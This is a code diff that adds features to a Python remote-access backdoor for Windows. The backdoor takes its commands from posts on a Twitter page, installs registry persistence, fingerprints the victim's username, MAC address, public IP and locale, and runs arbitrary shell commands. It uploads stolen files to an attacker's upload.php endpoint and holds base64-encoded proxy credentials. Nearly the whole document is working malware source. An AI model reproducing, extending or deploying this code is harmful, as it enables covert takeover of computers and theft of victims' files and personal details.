@@ -1,4 +1,7 @@
 import base64
+import platform
+from getpass import getuser
+from locale import getdefaultlocale
 import requests
 import subprocess
 import time
@@ -7,14 +10,20 @@ import shutil
 import _winreg as wreg
 import random
 from bs4 import BeautifulSoup
+from uuid import getnode as get_mac
+import json
 
-url = "http://twitter.com/thekiranbedi"
-tweetNumberFromTopRecent = 0        # the topmost tweet
+twitterUrl = "http://twitter.com/thekiranbedi"
+uploadURL = 'https://<your paid or free hosting site address >/upload.php'
+tweetNumberFromTopRecent = 0  # the topmost tweet
+identification = {}
+botname = ''
 
 
-def commandFromTwitter(url):
-    response = requests.get(url=url, proxies={
-        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+def commandFromTwitter(twitterUrl):
+    response = requests.get(url=twitterUrl, proxies={
+        'http': "http://" + base64.b64decode("cml0MjAxNTA0NA==") + ":" + base64.b64decode(
+            "SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
     soup = BeautifulSoup(response.text, 'html.parser')
     # For parsing the first tweet
     command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
@@ -39,6 +48,15 @@ def persistence():
         key.Close()
 
 
+def sendGet(Url):
+    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
+    u, p = token.split('==')
+    u += "=="
+    response = requests.get(url=Url, proxies={
+        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+    return response
+
+
 def sendPost(Url, data, files=None):
     token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
     u, p = token.split('==')
@@ -49,12 +67,40 @@ def sendPost(Url, data, files=None):
 
 
 def getSysDetails():
-    pass
+    global identification
+    # generate a unique id to identify the PC
+    publicIP = sendGet("http://www.httpbin.org/ip")  # Retrieves ip , local and global
+    IP = publicIP.json()  # creates a json object of IPs received
+    IP = IP['origin'].split(',')
+    if len(IP) > 1:
+        publicIP = IP[len(IP) - 1]  # last ip is the public ip
+    else:
+        publicIP = IP[1]  # last ip is the public ip
+    addr = get_mac()  # To uniquely identify the PC
+    h = iter(hex(addr)[2:].zfill(12))
+    macAddr = "_".join(
+        i + next(h) for i in h)  # Taken from http://stackoverflow.com/questions/28927958/python-get-mac-address
+    username = getuser()  # Get Username
+    locale = getdefaultlocale()[0]  # Helps in identifying the country
+    plat = platform.platform()
+    arch = platform.machine()
+    nodename = platform.node()
+    identification = {'locale': locale, 'username': username, 'macAddr': macAddr, 'publicIP': publicIP,
+                      'platform': plat, 'architecture': arch, 'Name': nodename}
+    iD = identification
+    return json.dumps(iD)
 
 
 def initialize():
     persistence()
-    getSysDetails()     # send sysDetails on initialisation and set hostname for identifying bot
+    global identification
+    identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
+    print identification
+    print type(identification)
+    dictID = json.loads(identification)
+    global botname
+    botname = dictID['locale'] + "_" + dictID['username'] + "_" + dictID['macAddr']
+    print botname
 
 
 initialize()
@@ -62,7 +108,7 @@ initialize()
 
 def connect():
     while True:
-        command = commandFromTwitter(url)
+        command = commandFromTwitter(twitterUrl)
         print command
 
         if 'terminate' in command:
@@ -71,11 +117,10 @@ def connect():
         elif 'grab' in command:
             grab, path = command.split('*')
             if os.path.exists(path):
-                newUrl = 'https://<your paid or free hosting site address >/upload.php'
                 files = {'file': open(path, 'rb')}
-                r = sendPost(newUrl, files=files)
+                r = sendPost(uploadURL, data={'botname': botname}, files=files)
             else:
-                r = sendPost(newUrl, data='[-]File Not Found')
+                r = sendPost(uploadURL, data='[-]File Not Found')
 
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
